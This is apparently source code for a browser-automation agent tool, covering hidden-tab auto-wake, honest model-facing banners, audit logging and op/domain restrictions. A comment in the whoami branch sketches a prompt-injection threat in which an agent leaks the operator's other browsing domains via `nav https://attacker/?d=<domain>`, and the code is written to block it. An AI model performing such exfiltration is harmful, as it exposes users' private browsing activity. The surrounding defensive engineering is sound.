// backstop for URL churn. On a page that rewrites its URL on every interaction
// (hash routing, `?t=` cache-busters, history.replaceState on infinite scroll)
// every read yields a fresh key, so "wake once per page" silently degrades to
// "wake per read": 3 bridge calls + a ~1.5s settle each, against a per-instance
// 5/s + burst-20 limiter.
//
// The cap is BOUND TO THE RUN'S STEP BUDGET (`BROWSER_AGENT_STEPS`, which the
// browser-agent wrapper already knows and now exports). A fixed 8 STARVED
// legitimate runs: 12 distinct pages reached by nav+text is not churn, yet pages
// 8-11 were never woken, silently reverting the back half of a default
// `--steps 12` run to BROWSER_AGENT_AUTO_WAKE=0 behaviour.
//
// ⚠ Be precise about what this buys, because the obvious phrasing is a claim
// nothing enforces. `STEPS` is a PROMPTED budget only — the wrapper `sed`s it into
// the agent md and the task message ("Hard budget: N steps"); the `opencode` argv
// carries NO step-limit flag, so nothing stops a model from exceeding it. So this
// is NOT "a run cannot read more pages than it has steps". What it actually gives
// is: at most one injected wake per tool call, and no more than the model's own
// prompted budget in total unless the operator raises it. The REAL ceiling on a
// runaway run is `--timeout` (default 120s, enforced by a process-group kill).
// Consequently the cap is close to non-binding by construction — it only engages
// after the model has already blown its unenforced budget. That is the accepted
// price of killing the starvation: worst case for a churny `--steps 12` run went
// from 8 wakes (~24 bridge calls, ~12s of settles) to 12 (~36 calls, ~18s), and it
// scales linearly with an operator-chosen `--steps`.
export const AUTO_WAKE_TAB_CAP = 8;         // fallback when STEPS is unknown
export const AUTO_WAKE_CAP_FLOOR = 4;       // a 1-2 step run still gets a few

// Precedence: the operator's explicit override > the run's step budget > the
// fallback. A junk value at either source falls through rather than producing NaN
// (`NaN >= n` is false, i.e. a junk cap would silently mean UNCAPPED).
export function autoWakeTabCap(env) {
  const override = String((env && env.BROWSER_AGENT_AUTO_WAKE_MAX) ?? "").trim();
  if (/^[0-9]+$/.test(override)) return Number(override);
  const steps = String((env && env.BROWSER_AGENT_STEPS) ?? "").trim();
  if (/^[0-9]+$/.test(steps)) return Math.max(Number(steps), AUTO_WAKE_CAP_FLOOR);
  return AUTO_WAKE_TAB_CAP;
}

// tabId -> { pages: Map<pageKey, {ok, detail}>, wakes: number }. Module-level,
// i.e. per browser-agent PROCESS — exactly the lifetime of one `browser agent`
// run. Nothing is persisted to disk.
//
// ⚠ The VERDICT is stored, not just the key. Storing only "we tried" was a real
// defect: a failed wake then read as a SUCCESSFUL one, and every later read of
// that page was handed a throttled shell plus an authoritative assurance that it
// was rendered — a reassured wrong answer, strictly worse than the silent one.
const _wakeState = new Map();

function _tabState(tab) {
  let s = _wakeState.get(tab);
  if (!s) { s = { pages: new Map(), wakes: 0 }; _wakeState.set(tab, s); }
  return s;
}

// Test/seam hook: forget every recorded wake.
export function resetAutoWakeState() { _wakeState.clear(); }

// The identity of the PAGE a read observed. Every read result carries the url it
// read (extension/service_worker.js: `{url: tab.url, ...}`; for a `--frame` read
// it is the FRAME's url). Using the url as the key means an in-page navigation
// the agent caused with `click`/`eval` — not just an explicit `nav` — produces a
// new key, so the new (freshly throttled) page is woken again. It does NOT catch
// a same-URL document replacement; PAGE_INVALIDATING_OPS covers that.
export function pageKeyOf(data) {
  return typeof (data && data.url) === "string" ? data.url : "";
}

// The recorded wake VERDICT for a page: {ok, detail}, or undefined if none.
export function getPageWake(tab, key) {
  const s = _wakeState.get(tab);
  return s ? s.pages.get(key) : undefined;
}

export function hasWokenPage(tab, key) { return getPageWake(tab, key) !== undefined; }

export function wakeCountForTab(tab) {
  const s = _wakeState.get(tab);
  return s ? s.wakes : 0;
}

// Reserve the page BEFORE the attempt (so a failure is never retried once per
// read) and charge the tab's wake budget. The placeholder verdict is a FAILURE:
// if the process is interrupted between the attempt and its outcome, the
// conservative reading — "we cannot vouch for this page" — is what survives.
//
// An EMPTY key means the read carried no url, i.e. we cannot identify the page.
// The budget is still charged (so an urlless page cannot wake without limit) but
// NOTHING is stored: an empty key would collide with every other urlless read and
// vouch for a document it never saw.
//
// ⚠ So "one failed wake per page, not one per read" holds for every IDENTIFIABLE
// page and NOT for an urlless one: with no verdict stored, a failed wake there is
// re-attempted on each subsequent read until the tab's budget runs out. That is a
// cost, cap-bounded, and it is the correct side to err on — the alternative is a
// shared empty-key verdict that a different urlless document would inherit.
// Reads carry a url on every path the extension implements, so this is degenerate.
export function markPageWakeAttempt(tab, key) {
  const s = _tabState(tab);
  s.wakes += 1;
  if (!key) return s.wakes;
  if (s.pages.size >= AUTO_WAKE_PAGE_CAP) s.pages.clear();
  s.pages.set(key, { ok: false, detail: "the wake did not complete" });
  return s.wakes;
}

export function recordPageWakeOutcome(tab, key, ok, detail) {
  if (!key) return;   // never write a verdict that any urlless read would match
  _tabState(tab).pages.set(key, { ok: !!ok, detail: String(detail || "") });
}

// A document replacement voids every page verdict for the tab. The wake COUNT is
// deliberately NOT reset: the cap is a per-RUN backstop against churn, and churn
// is exactly the case that navigates repeatedly.
export function forgetPageWakes(tab) {
  const s = _wakeState.get(tab);
  if (s) s.pages.clear();
}

// Kill switch (reversibility): BROWSER_AGENT_AUTO_WAKE=0 restores the pre-fix
// behaviour of never auto-waking. The signal-preservation half stays on either
// way — turning auto-wake off must not put us back to a SILENT wrong answer.
export function autoWakeEnabled(env) {
  return String((env && env.BROWSER_AGENT_AUTO_WAKE) ?? "1").trim() !== "0";
}

// Fallback wording if the server's own note is missing (older extension / a mock).
export const HIDDEN_FALLBACK_NOTE =
  "tab is hidden — background tabs are throttled, so SPA content may not have rendered.";

// The hedge every post-wake banner carries. `woke` is probed by reading
// visibilityState INSIDE the CDP attach (service_worker.js wakeProbeFn) — it says
// the tab was un-throttled, and NOTHING about whether the SPA finished rendering
// inside the bounded settle (1500ms default, 6000ms cap). A heavy app that needs
// longer yields woke:true AND an unrendered shell, so a flat "this is the rendered
// page" claim would over-promise on exactly the class of page this fix targets.
const WAKE_HEDGE =
  "The wake holds only a bounded settle, so a slow app may still not have finished: " +
  "if the content below looks like a loading/placeholder state, it IS one — say so " +
  "instead of reporting it as fact.";

// The one-line, model-facing banner prepended to a read whose tab was hidden.
// `autoWake` is null (no wake was attempted — e.g. `eval`, or the kill switch) or
// {state, woke, detail}. Pure + exported so the wording is unit-assertable.
//
// ⚠ Grading is load-bearing. `note:` is only ever used for a wake this tool can
// VOUCH for; anything unproven — failed, not-retried, skipped, never attempted —
// is `WARNING:` and names the reason. A `note:` on an unrendered page is worse
// than no banner at all, because it actively reassures the model.
export function hiddenNotice(data, autoWake) {
  const note = (data && typeof data.note === "string" && data.note)
    ? data.note : HIDDEN_FALLBACK_NOTE;
  const st = autoWake && autoWake.state;
  if (st === "woke" && autoWake.woke === true) {
    return "[browser-tool] your tab was HIDDEN and throttled, so 'wake' was issued " +
      `AUTOMATICALLY (${autoWake.detail}) and the content below is the RE-READ after ` +
      `waking. ${WAKE_HEDGE}`;
  }
  if (st === "woke") {
    return "[browser-tool] WARNING: your tab was HIDDEN; an automatic 'wake' ran but " +
      `could NOT confirm the tab un-throttled (${autoWake.detail}). The content below ` +
      `is the re-read and may STILL be an unrendered shell. ${WAKE_HEDGE}`;
  }
  if (st === "already-woke") {
    return "[browser-tool] note: your tab is hidden, but 'wake' already SUCCEEDED for " +
      "this page — the DOM it rendered persists, so the content below is post-wake. " +
      WAKE_HEDGE;
  }
  if (st === "already-failed") {
    return "[browser-tool] WARNING: your tab is HIDDEN and the automatic 'wake' for this " +
      `page FAILED earlier (${autoWake.detail}); it is deliberately not retried per read. ` +
      `The content below may be an unrendered shell, NOT the real page. ${note}`;
  }
  if (st === "failed") {
    return "[browser-tool] WARNING: your tab is HIDDEN and the automatic 'wake' FAILED " +
      `(${autoWake.detail}). The content below may be an unrendered shell, NOT the real ` +
      `page. ${note}`;
  }
  if (st === "dryrun") {
    return "[browser-tool] WARNING: your tab is HIDDEN and Chromium throttles it. The " +
      "automatic 'wake' was SKIPPED because this is a DRY RUN (a wake attaches the " +
      "debugger to a live tab). The content below may be an unrendered shell, NOT the " +
      `real page. ${note}`;
  }
  if (st === "capped") {
    return "[browser-tool] WARNING: your tab is HIDDEN and the automatic wake was SKIPPED " +
      `— this run has spent its wake budget (${autoWake.detail}), which usually means the ` +
      "page rewrites its URL on every read. The content below may be an unrendered shell, " +
      `NOT the real page. ${note}`;
  }
  return "[browser-tool] WARNING: your tab is HIDDEN and Chromium throttles it — the " +
    `content below may be an unrendered shell, NOT the real page. ${note}`;
}

// Prepend the banner when the read was hidden (or when a wake was attempted at
// all, so a wake that un-hid the tab is still reported honestly).
function _withHiddenNotice(data, body, autoWake) {
  if (data.hidden !== true && !autoWake) return body;
  return `${hiddenNotice(data, autoWake)}\n\n${body}`;
}

// Pull a compact, model-facing string out of the server's 200 envelope. NEVER
// dumps a base64 screenshot blob into the model context.
//
// `env` is only consulted by `whoami`, to narrow the instance list to the agent's
// OWN forced instance (see that branch). It defaults to {} so every other op — and
// every existing caller/test — is unaffected; an absent env simply means "no
// instance forced", which is already the safe shape (no browsing domains are ever
// emitted regardless).
// `autoWake` (4th arg, default null) carries what runBrowserOp did about a hidden
// tab — see hiddenNotice. It only affects text/html/eval; every other op and every
// existing caller/test is unaffected.
//
// 🔴 `site_notes` IS NOT FORWARDED, AND THAT IS DELIBERATE — but it is a REAL
// capability gap, not a nil-cost omission, so it is written down rather than left
// to be rediscovered. server.py sets `site_notes` on the ENVELOPE ROOT
// (_annotate_site_notes: `result["site_notes"] = path`), while every branch below
// reads `envelope.data` — so the field is structurally invisible to the model on
// every op it can reach.
//
// TWO PRECISIONS, because a comment is a claim and both were wrong once:
//  * the reachable set is the 14 values of OP_TO_SERVER, NOT the 13 of
//    ALLOWED_OPS_DEFAULT — `upload` is off by default but re-enablable via
//    BROWSER_AGENT_ALLOWED_OPS (see line ~159), so it is reachable and is covered.
//  * "every branch reads envelope.data" is the mechanism for all of them EXCEPT
//    `whoami`, which reads the ROOT (`const w = envelope || {}`). It is safe for a
//    DIFFERENT reason — it answers GET /whoami, which _annotate_site_notes never
//    touches, and its output is field-pinned regardless. Do not generalise the
//    `.data` mechanism to it; the guard in tests/browser_tool.test.mjs covers both
//    by asserting the OUTPUT, which is why it does not care which is which.
//
// WHY IT STAYS DROPPED: the value is a repo-relative PATH to a reference doc, and
// the agent def denies every built-in tool including `read`. Forwarding it would
// hand the model a filename it has no capability to open — an instruction it can
// only fail to follow, on every single op of every run, for a site whose notes
// exist precisely because that site misleads a naive driver.
//
// 🔴 THE CONSEQUENCE, which belongs to the CALLER and not to this file: on a
// registered host the agent runs WITHOUT the site's flow notes — the sign-in,
// account-switch, picker and wizard sequences, and the reads that lie there. So
// "agent-first when ambiguous" is wrong for exactly those hosts. SKILL.md says so
// in one sentence (it has a hard byte ceiling); the ACTIONABLE half — how to tell
// a site-noted host, and how to brief its flows into a goal — is
// reference/agent.md § "The agent never sees `site_notes`", which has no ceiling.
// tests/browser_tool.test.mjs pins both halves: that no reachable op forwards the
// field, and that SKILL.md still warns about it.
export function summarizeResult(op, envelope, env = {}, autoWake = null) {
  const data = (envelope && envelope.data) || {};
  if (op === "text") {
    const body = typeof data.text === "string" ? data.text : JSON.stringify(data);
    return _withHiddenNotice(data, body, autoWake);
  }
  if (op === "html") {
    const body = typeof data.html === "string" ? data.html : JSON.stringify(data);
    return _withHiddenNotice(data, body, autoWake);
  }
  if (op === "eval") {
    const v = "value" in data ? data.value : data.result;
    const body = typeof v === "string" ? v : JSON.stringify(v ?? data);
    return _withHiddenNotice(data, body, autoWake);
  }
  if (op === "nav") {
    return JSON.stringify({ ok: true, url: data.url ?? null, title: data.title ?? null });
  }
  if (op === "screenshot") {
    const du = typeof data.dataUrl === "string" ? data.dataUrl : "";
    return JSON.stringify({ ok: true, screenshot: true, bytes: du.length,
      note: du.slice(0, SCREENSHOT_NOTE_MAX) ? "captured" : "empty" });
  }
  if (op === "frames") {
    // Compact frame metadata (frameId/url/name) so the model can pick a --frame.
    return JSON.stringify(Array.isArray(data.frames) ? data.frames : data);
  }
  if (op === "click") {
    return JSON.stringify({ ok: true, clicked: data.clicked ?? null,
      x: data.x ?? null, y: data.y ?? null });
  }
  if (op === "type") {
    // Never echo the typed text back to the model context — only the length.
    return JSON.stringify({ ok: true, typed: data.typed ?? null });
  }
  if (op === "key") {
    return JSON.stringify({ ok: true, key: data.key ?? null });
  }
  if (op === "upload") {
    // Metadata-only confirmation: the selector + the BASENAME(s) set (never the
    // full path — that stays server/CLI-side + in the audit log) + the frame.
    return JSON.stringify({ ok: true, selector: data.selector ?? null,
      files: Array.isArray(data.files) ? data.files : [],
      frame: data.frame ?? null });
  }
  if (op === "wake") {
    // Compact confirmation the tab was un-throttled (metadata only — no page
    // content). `woke` is the honest verdict: true only when the probe saw
    // visibilityState "visible" while the CDP session was attached.
    return JSON.stringify({ ok: true, tabId: data.tabId ?? null,
      woke: data.woke ?? null, visibilityState: data.visibilityState ?? null,
      readyState: data.readyState ?? null, settleMs: data.settleMs ?? null,
      url: data.url ?? null, title: data.title ?? null });
  }
  if (op === "context") {
    // Page-level metadata for the agent's OWN tab. Field-pinned rather than a
    // bare passthrough, so a later server-side addition to the `context`
    // payload cannot silently widen what reaches the model.
    return JSON.stringify({
      url: data.url ?? null, domain: data.domain ?? null,
      path: data.path ?? null, searchParams: data.searchParams ?? null,
      title: data.title ?? null, tabId: data.tabId ?? null,
    });
  }
  if (op === "emulate") {
    // Field-pinned like `context`, not a bare passthrough: a later server-side
    // addition to the emulate payload must not silently widen what reaches the
    // model. `note` and `emulationNote` are carried because they are exactly the
    // two strings the model must ACT on: on a reset, the note that says the
    // viewport does NOT come back (so the model must not re-read expecting a
    // desktop width — the tab is stuck until the wrapper closes it), and the
    // create-time hint that says a document created BEFORE this emulate needs a
    // re-`nav` before touch-dependent behaviour is real.
    //
    // ⚠ The note is NOT "the tab is not emulated between ops" any more — that
    // claim was measured false for the viewport (#319, see the header). Do not
    // reintroduce a summary of the note here; forward the string the extension
    // actually emitted, which is what this passthrough does.
    return JSON.stringify({
      ok: true,
      tabId: data.tabId ?? null,
      url: data.url ?? null,
      reset: data.reset ?? false,
      emulation: data.emulation ?? null,
      wasEmulating: data.wasEmulating ?? null,
      applied: Array.isArray(data.applied) ? data.applied : null,
      documentPredatesEmulation: data.documentPredatesEmulation ?? false,
      note: typeof data.note === "string" ? data.note : null,
      emulationNote: typeof data.emulationNote === "string" ? data.emulationNote : null,
    });
  }
  if (op === "whoami") {
    // Identity + diagnostics. `envelope` IS the whole whoami object (no .data).
    // METADATA ONLY, and NARROWED to the op's stated purpose: "which HOST and
    // which PROFILE am I on". No page content, no full URLs, and — critically —
    // no reconnaissance of the OPERATOR'S OTHER PROFILES.
    //
    // Two fields the server returns are deliberately DROPPED here:
    //
    //  1. `activeTabDomain`, on every instance. The server's whoami_snapshot
    //     iterates ALL live instances, so a bare passthrough tells the model what
    //     the operator is browsing in unrelated profiles (e.g. a `banking` profile
    //     sitting on chase.com while the agent runs on `work`). With no
    //     --allow-domains set, hostDenied() permits any host, so that is one
    //     `nav https://attacker/?d=<domain>` away from exfil — by a model that is
    //     by design reading untrusted, prompt-injecting pages. This is exactly the
    //     leak the OP_TO_SERVER comment cites as the reason `tabs` is excluded
    //     ("`tabs` would leak other tabs' URLs"); whoami reintroduced a narrower
    //     version of it. Dropped unconditionally — the agent never needs to know
    //     what any tab, including its own, is pointed at (it can read its own).
    //  2. The git HEAD inside `server_version` ({version, git:<short sha>}). Only
    //     the human-facing `version` survives; the commit sha is host-internal
    //     state with no bearing on "which profile am I on".
    //
    // The instance list is also FILTERED to the agent's own forced instance
    // (BROWSER_AGENT_INSTANCE — the same value buildRequest sends as `target`,
    // set by the wrapper, unsettable by the model). The wrapper accepts either an
    // auto key or a label there, so match either. If an instance is forced and
    // nothing matches, return an empty list rather than falling back to "all" —
    // failing closed on reconnaissance. When no instance is forced (the bridge
    // auto-routes) the list is left as-is; it then carries only key/label/version,
    // never a browsing domain.
    const w = envelope || {};
    const host = w.host || {};
    const bridge = w.bridge || {};
    const instances = Array.isArray(w.instances) ? w.instances : [];
    const sv = bridge.server_version;
    const own = String(env.BROWSER_AGENT_INSTANCE ?? "").trim();
    const mine = own
      ? instances.filter((i) => i.key === own || i.label === own)
      : instances;
    return JSON.stringify({
      host: { label: host.label ?? null, source: host.source ?? null },
      bridge: {
        endpoint: bridge.endpoint ?? null,
        connected: bridge.connected ?? null,
        // Drop the git HEAD: keep only the human-facing version string.
        server_version: (sv && typeof sv === "object" ? sv.version : sv) ?? null,
        extension_version_current: bridge.extension_version_current ?? null,
      },
      instances: mine.map((i) => ({
        key: i.key ?? null, label: i.label ?? null,
        extension_version: i.extension_version ?? null,
      })),
    });
  }
  return JSON.stringify(data);
}

function _audit(env, decision, op, detail) {
  // Metadata-only audit line (#173): op + decision + a short detail (host/op) —
  // NEVER page content. Best-effort; a failure here never fails the tool.
  const path = env.BROWSER_AGENT_AUDIT;
  if (!path) return;
  try {
    const line = JSON.stringify({
      ts: Math.round(Date.now()) / 1000,
      tool: "browser", decision, op: op || "?", detail: detail || "",
    }) + "\n";
    appendFileSync(path, line);
  } catch { /* best-effort */ }
}

// The tool entrypoint. Returns a model-facing STRING on success/dry-run; throws
// BrowserToolRefusal on a policy violation and Error on infra failure.
//   opts.env        — environment (default process.env)
//   opts.fetchImpl  — fetch (default global fetch)
//   opts.readToken  — () => bearer secret string (default: read the token file)
export async function runBrowserOp(args, opts = {}) {
  const env = opts.env || (typeof process !== "undefined" ? process.env : {});
  const fetchImpl = opts.fetchImpl || (typeof fetch !== "undefined" ? fetch : null);
  const op = String((args && args.op) || "");

  // Dry-run intercept for navigating/mutating ops — log + synthesize, never touch
  // the browser (mirrors the retired guard's --dry-run). Still enforces the op
  // allowlist + forced tab first, so a bad op/tab is refused even in dry-run.
  const dry = String(env.BROWSER_AGENT_DRY_RUN || "") === "1";
  // Intercept the MUTATING ops (navigate / evaluate / trusted input) so a dry-run
  // never actually drives the browser, while still enforcing the op allowlist +
  // forced tab (a bad op/tab is refused even in dry-run).
  const MUTATING = op === "nav" || op === "eval" ||
                   op === "click" || op === "type" || op === "key" ||
                   op === "upload" ||    // upload populates a file input → never in a dry-run
                   op === "emulate" ||   // emulate ATTACHES THE DEBUGGER → same as wake
                   op === "wake";        // wake ATTACHES THE DEBUGGER → see below
  // (`activate` used to be listed here. It is now unreachable for the agent at
  //  all — absent from OP_TO_SERVER — so buildRequest refuses it long before this
  //  point.)
  //
  // `wake` USED to be excluded here, on the reasoning that it changes no page
  // state and moves no focus, so a dry-run could exercise it like a read. That is
  // true of the PAGE and false of the OPERATOR: a wake attaches chrome.debugger to
  // their live tab for up to a 6s settle, which raises Brave's "an extension is
  // debugging this browser" banner. A dry-run promises "logs, doesn't drive", and
  // the auto-wake path + reference/agent.md now both justify skipping the wake
  // with exactly that promise. Leaving the MANUAL `op="wake"` able to attach in a
  // dry run made the documented guarantee stronger than the code — so the code is
  // hardened to match, not the doc softened. A dry-run wake now synthesizes like
  // any other mutating op.
  if (dry && MUTATING) {
    const allowed = allowedOpsFromEnv(env);
    if (!allowed.includes(op)) throw new BrowserToolRefusal(`op_not_allowed:${op}`);
    forcedTab(env); // refuse a disowned tab even in dry-run
    // Enforce domain policy on a dry-run nav too (so a dry-run can't "preview" a
    // denied domain and mislead).
    if (op === "nav") {
      const scheme = navSchemeOf(args && args.url);
      if (!NAV_ALLOWED_SCHEMES.includes(scheme)) {
        throw new BrowserToolRefusal(`nav_scheme_denied:${scheme || "<none>"}`);
      }
      const host = hostOf(args && args.url);
      if (hostDenied(host, _list(env.BROWSER_AGENT_ALLOW_DOMAINS),
                     _list(env.BROWSER_AGENT_DENY_DOMAINS))) {
        throw new BrowserToolRefusal(`domain_blocked:${host || (args && args.url)}`);
      }
    }
    _audit(env, "dry_run", op, (args && (args.url || "")) || "");
    return JSON.stringify({ ok: true, dryRun: true, op });
  }

  const readToken = opts.readToken || (() => _readTokenFile(env));
  const token = readToken();
  if (!token) throw new Error("browser-tool: no bearer token (BROWSER_BRIDGE_TOKEN_FILE unreadable)");
  if (!fetchImpl) throw new Error("browser-tool: no fetch implementation available");

  let req;
  try {
    req = buildRequest(args, env, token);
  } catch (e) {
    if (e instanceof BrowserToolRefusal) _audit(env, "refused", op, e.reason);
    throw e;
  }

  _audit(env, "exec", op, op === "nav" ? hostOf(args.url) : "");
  const outer = await _send(req, fetchImpl);
  // whoami returns the diagnostic object DIRECTLY ({ok,host,bridge,instances}) —
  // there is no {result:<envelope>} wrapper like /cmd. Summarize it as-is.
  if (op === "whoami") return summarizeResult("whoami", outer, env);
  let envelope = outer && outer.result;
  if (envelope && envelope.ok === false) {
    // An op-level failure in the page (e.g. owned_tab_gone) — surface to the model.
    throw new BrowserToolRefusal(`op_failed:${envelope.error || "unknown"}`);
  }

  // ⚠ A `wake` the MODEL called is deliberately NOT recorded as this page's wake.
  // It looks like a free optimisation (skip the tool's own wake right after a
  // manual one) and it is a correctness trap: the extension reports the url from a
  // `chrome.tabs.get` taken AFTER the settle, so if the URL changed during the
  // ~1.5s window — a redirect completing, history.replaceState, an SPA route
  // settling — the verdict lands on document B while the settle was spent on
  // document A, and B's shell then gets a `note: … the DOM it rendered persists`.
  // That is exactly the reassured-wrong-answer failure this whole change exists to
  // remove. The AUTO path is immune because it keys on the PRE-wake read's url, so
  // a URL change during the wake fails safe. Closing the gap properly needs the
  // extension to also return the pre-attach url — an extension change, hence a
  // manifest bump and a full Brave re-point — which is not worth saving one wake.
  // DO NOT reintroduce this without that pre-attach url.

  // --- the hidden-tab auto-wake (see AUTO_WAKE_OPS above) --------------------
  // NOTE the ORDER: the banner for THIS read is decided first, from the
  // bookkeeping as it stood when the read happened, and only then does a
  // document-replacing op void the records. An `eval` is both — its value was
  // produced by the OLD document, so it is described against the old verdict and
  // invalidates only what comes after it.
  let autoWake = null;
  const data = (envelope && envelope.data) || {};
  if (data.hidden === true && HIDDEN_SIGNAL_OPS.includes(op)) {
    const tab = forcedTab(env);          // already validated by buildRequest
    const key = pageKeyOf(data);
    const prior = getPageWake(tab, key);
    if (prior) {
      // WAKE ONCE PER PAGE. The un-throttled state itself dies with the CDP
      // detach, but the DOM the page rendered during the wake PERSISTS — so a
      // following read is cheap and correct without paying another ~1.5s settle.
      // The stored VERDICT decides the wording: a page whose wake FAILED must
      // never be described as post-wake.
      autoWake = prior.ok
        ? { state: "already-woke", woke: true, detail: prior.detail }
        : { state: "already-failed", woke: false, detail: prior.detail };
    } else if (!AUTO_WAKE_OPS.includes(op)) {
      // `eval`: signal only, never auto-re-run. autoWake stays null → the generic
      // hidden WARNING, which is the honest description (nothing was attempted).
    } else if (!autoWakeEnabled(env)) {
      // Kill switch. Checked BEFORE the dry-run branch so a run with BOTH set is
      // told which one actually stopped the wake — the more specific cause first.
      // autoWake stays null → the generic hidden WARNING.
    } else if (dry) {
      // A dry-run's contract is "logs, never actually drives the browser". A read
      // is passive, but a `wake` ATTACHES THE DEBUGGER to the operator's live tab
      // and raises Brave's "an extension is debugging this browser" banner — a
      // categorical step past that. (The MANUAL `op="wake"` is now intercepted the
      // same way, via MUTATING.) Skip it and say what would have happened; the
      // signal is preserved either way.
      autoWake = { state: "dryrun", woke: null, detail: "" };
    } else {
      const cap = autoWakeTabCap(env);
      if (wakeCountForTab(tab) >= cap) {
        // Churn backstop (URL-rewriting pages defeat the per-page key). Stop
        // waking, but say so LOUDLY — never silently hand back the shell.
        autoWake = { state: "capped", woke: null, detail: `${wakeCountForTab(tab)}/${cap} wakes used` };
        _audit(env, "auto_wake_capped", op, `${wakeCountForTab(tab)}/${cap}`);
      } else {
        // Reserved BEFORE the attempt on purpose: if the wake fails, every later
        // read of this page must NOT retry it. One failed wake per page, not one
        // per read — and the failure VERDICT is what gets stored.
        markPageWakeAttempt(tab, key);
        _audit(env, "auto_wake", op, "hidden");
        const r = await _autoWakeAndReRead(args, env, token, fetchImpl);
        if (r.ok) {
          envelope = r.envelope || envelope;
          autoWake = { state: "woke", woke: r.woke, detail: r.detail };
          // `woke !== true` is NOT a page we can vouch for later: record it as a
          // failure so a follow-up read gets the WARNING, not the `note:`.
          recordPageWakeOutcome(tab, key, r.woke === true, r.detail);
          _audit(env, r.woke === true ? "auto_wake_ok" : "auto_wake_unconfirmed", op, r.detail);
        } else {
          // FAIL-OPEN: never turn a working read into an error. Return the original
          // read, loudly labelled.
          autoWake = { state: "failed", woke: null, detail: r.detail };
          recordPageWakeOutcome(tab, key, false, r.detail);
          _audit(env, "auto_wake_failed", op, r.detail);
        }
      }
    }
  }

  // A successful nav/click/key/eval can put a BRAND-NEW document in the tab — and
  // a form POST, a reload or a same-URL SPA remount does it WITHOUT changing the
  // url, so the page key cannot see it. Void the tab's verdicts; the new document
  // is throttled from scratch. (The wake COUNT survives — see forgetPageWakes.)
  if (PAGE_INVALIDATING_OPS.includes(op)) {
    try { forgetPageWakes(forcedTab(env)); } catch { /* no tab → nothing to forget */ }
  }

  return summarizeResult(op, envelope || {}, env, autoWake);
}

// POST/GET a prepared request and return the parsed outer JSON body.
async function _send(req, fetchImpl) {
  let resp;
  try {
    const method = req.method || "POST";
    const init = { method, headers: req.headers };
    // A GET (whoami) carries no body; a /cmd POST sends the typed command body.
    if (method !== "GET") init.body = JSON.stringify(req.body);
    resp = await fetchImpl(req.url, init);
  } catch (e) {
    throw new Error(`browser-tool: transport error talking to the bridge: ${e && e.message}`);
  }
  const st = resp.status;
  const textBody = await resp.text();
  if (st !== 200) {
    throw new Error(`browser-tool: bridge returned HTTP ${st}: ${textBody.slice(0, 300)}`);
  }
  try {
    return JSON.parse(textBody);
  } catch {
    throw new Error("browser-tool: unparseable bridge response");
  }
}

// Every `detail` that reaches a model-facing banner or the audit log goes through
// here — an op error is server-supplied and must not be interpolated unbounded.
function _msg(e) { return String((e && e.message) || e || "").slice(0, 200); }

// Issue `wake` on the agent's (env-forced) tab, then RE-RUN the caller's original
// read and return its envelope. Never throws: every failure comes back as
// {ok:false, detail} so the caller can fall back to the original read.
//
// `wake` goes through buildRequest like any other op, so the op allowlist still
// applies — an operator who narrowed BROWSER_AGENT_ALLOWED_OPS to exclude `wake`
// gets a clean refusal here and the fail-open path, not a bypass.
//
// Both injected calls are AUDITED (`auto_wake_exec`), so a reader of
// BROWSER_AGENT_AUDIT sees the wake and the re-read the tool issued on its own
// initiative — not just the model's own calls. The caller then logs the outcome.
async function _autoWakeAndReRead(args, env, token, fetchImpl) {
  let woke = null;
  let detail = "";
  try {
    // Audited AFTER buildRequest, never before: a wake the op-allowlist refuses
    // never reaches the bridge, so logging an `exec` for it would be untrue.
    const wakeReq = buildRequest({ op: "wake" }, env, token);
    _audit(env, "auto_wake_exec", "wake", "");
    const wakeOuter = await _send(wakeReq, fetchImpl);
    const wEnv = wakeOuter && wakeOuter.result;
    if (wEnv && wEnv.ok === false) {
      return { ok: false, detail: `wake failed: ${_msg(wEnv.error) || "unknown"}` };
    }
    const wd = (wEnv && wEnv.data) || {};
    woke = wd.woke === true;
    detail = `woke:${wd.woke ?? "unknown"} settleMs:${wd.settleMs ?? "unknown"}`;
  } catch (e) {
    return { ok: false, detail: `wake failed: ${_msg(e)}` };
  }
  // The wake's un-throttle does not survive its own CDP detach, but the DOM the
  // page rendered during it does — which is exactly what this re-read collects.
  try {
    const reReadReq = buildRequest(args, env, token);
    _audit(env, "auto_wake_exec", String((args && args.op) || ""), "re-read");
    const outer = await _send(reReadReq, fetchImpl);
    const envelope = outer && outer.result;
    if (envelope && envelope.ok === false) {
      return { ok: false, detail: `re-read failed: ${_msg(envelope.error) || "unknown"}` };
    }
    return { ok: true, envelope, woke, detail };
  } catch (e) {
    return { ok: false, detail: `re-read failed: ${_msg(e)}` };
  }
}

function _readTokenFile(env) {
  try {
    const path = env.BROWSER_BRIDGE_TOKEN_FILE
      || `${homedir()}/.config/browser-bridge/token`;
    return readFileSync(path, "utf8").trim();
  } catch {
    return "";
  }
}
